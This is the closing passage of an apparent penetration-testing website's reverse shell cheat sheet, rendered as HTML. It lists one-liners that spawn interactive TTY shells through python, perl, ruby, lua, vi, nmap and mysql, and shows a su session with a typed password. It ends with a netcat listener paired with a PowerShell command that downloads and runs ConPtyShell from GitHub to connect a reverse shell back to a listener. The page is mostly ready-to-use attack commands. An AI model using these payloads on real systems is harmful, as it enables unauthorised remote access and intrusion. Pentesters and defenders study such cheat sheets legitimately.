+</span></span><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#34;__import__(&#39;pty&#39;).spawn(&#39;/bin/bash&#39;)&#34;</span>
+</span></span><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#34;__import__(&#39;subprocess&#39;).call([&#39;/bin/bash&#39;])&#34;</span>
+</span></span><span style="display:flex;"><span>perl -e <span style="color:#e6db74">&#39;exec &#34;/bin/sh&#34;;&#39;</span>
+</span></span><span style="display:flex;"><span>perl<span style="color:#960050;background-color:#1e0010">:</span> exec <span style="color:#e6db74">&#34;/bin/sh&#34;</span>;
+</span></span><span style="display:flex;"><span>perl -e <span style="color:#e6db74">&#39;print `/bin/bash`&#39;</span>
+</span></span><span style="display:flex;"><span>ruby<span style="color:#960050;background-color:#1e0010">:</span> exec <span style="color:#e6db74">&#34;/bin/sh&#34;</span>
+</span></span><span style="display:flex;"><span>lua<span style="color:#960050;background-color:#1e0010">:</span> os.execute(<span style="color:#e6db74">&#39;/bin/sh&#39;</span>)
+</span></span></code></pre></div><ul>
+<li>vi: <code>:!bash</code></li>
+<li>vi: <code>:set shell=/bin/bash:shell</code></li>
+<li>nmap: <code>!sh</code></li>
+<li>mysql: <code>! bash</code></li>
+</ul>
+<p>Alternative TTY method</p>
+<pre tabindex="0"><code>www-data@debian:/dev/shm$ su - user
+su: must be run from a terminal
+
+www-data@debian:/dev/shm$ /usr/bin/script -qc /bin/bash /dev/null
+www-data@debian:/dev/shm$ su - user
+Password: P4ssW0rD
+
+user@debian:~$ 
+</code></pre><h2 id="fully-interactive-reverse-shell-on-windows">
+  Fully interactive reverse shell on Windows
+  <a class="anchor" href="#fully-interactive-reverse-shell-on-windows">#</a>
+</h2>
+<p>The introduction of the Pseudo Console (ConPty) in Windows has improved so much the way Windows handles terminals.</p>
+<p><strong>ConPtyShell uses the function 
+  <a href="https://docs.microsoft.com/en-us/windows/console/createpseudoconsole">CreatePseudoConsole()</a>. This function is available since Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763).</strong></p>
+<p>Server Side:</p>
+<pre tabindex="0"><code>stty raw -echo; (stty size; cat) | nc -lvnp 3001
+</code></pre><p>Client Side:</p>
+<pre tabindex="0"><code>IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
+</code></pre><p>Offline version of the ps1 available at &ndash;&gt; 
+  <a href="https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1">https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1</a></p>
+<h2 id="references">
+  References
+  <a class="anchor" href="#references">#</a>
+</h2>
+<ul>
+<li>
+  <a href="https://security.stackexchange.com/questions/166643/reverse-bash-shell-one-liner">Reverse Bash Shell One Liner</a></li>
+<li>
+  <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentest Monkey - Cheat Sheet Reverse shell</a></li>
+<li>
+  <a href="http://netsec.ws/?p=337">Spawning a TTY Shell</a></li>
+<li>
+  <a href="https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell">Obtaining a fully interactive shell</a></li>
+</ul>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/m00tiny/grayhatfreelancing/edit/main/exampleSite/content.en/docs/reverse_shell_cheatsheet.md" target="_blank" rel="noopener">
+      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#reverse-shell-cheat-sheet">Reverse Shell Cheat Sheet</a>
+      <ul>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#reverse-shell">Reverse Shell</a>
+          <ul>
+            <li><a href="#bash-tcp">Bash TCP</a></li>
+            <li><a href="#bash-udp">Bash UDP</a></li>
+            <li><a href="#socat">Socat</a></li>
+            <li><a href="#perl">Perl</a></li>
+            <li><a href="#python">Python</a></li>
+            <li><a href="#php">PHP</a></li>
+            <li><a href="#ruby">Ruby</a></li>
+            <li><a href="#golang">Golang</a></li>
+            <li><a href="#netcat-traditional">Netcat Traditional</a></li>
+            <li><a href="#netcat-openbsd">Netcat OpenBsd</a></li>
+            <li><a href="#netcat-busybox">Netcat BusyBox</a></li>
+            <li><a href="#ncat">Ncat</a></li>
+            <li><a href="#openssl">OpenSSL</a></li>
+            <li><a href="#powershell">Powershell</a></li>
+            <li><a href="#awk">Awk</a></li>
+            <li><a href="#java">Java</a></li>
+            <li><a href="#telnet">Telnet</a></li>
+            <li><a href="#war">War</a></li>
+            <li><a href="#lua">Lua</a></li>
+            <li><a href="#nodejs">NodeJS</a></li>
+            <li><a href="#groovy">Groovy</a></li>
+            <li><a href="#c">C</a></li>
+            <li><a href="#dart">Dart</a></li>
+          </ul>
+        </li>
+        <li><a href="#meterpreter-shell">Meterpreter Shell</a>
+          <ul>
+            <li><a href="#windows-staged-reverse-tcp">Windows Staged reverse TCP</a></li>
+            <li><a href="#windows-stageless-reverse-tcp">Windows Stageless reverse TCP</a></li>
+            <li><a href="#linux-staged-reverse-tcp">Linux Staged reverse TCP</a></li>
+            <li><a href="#linux-stageless-reverse-tcp">Linux Stageless reverse TCP</a></li>
+            <li><a href="#other-platforms">Other platforms</a></li>
+          </ul>
+        </li>
+        <li><a href="#spawn-tty-shell">Spawn TTY Shell</a></li>
+        <li><a href="#fully-interactive-reverse-shell-on-windows">Fully interactive reverse shell on Windows</a></li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
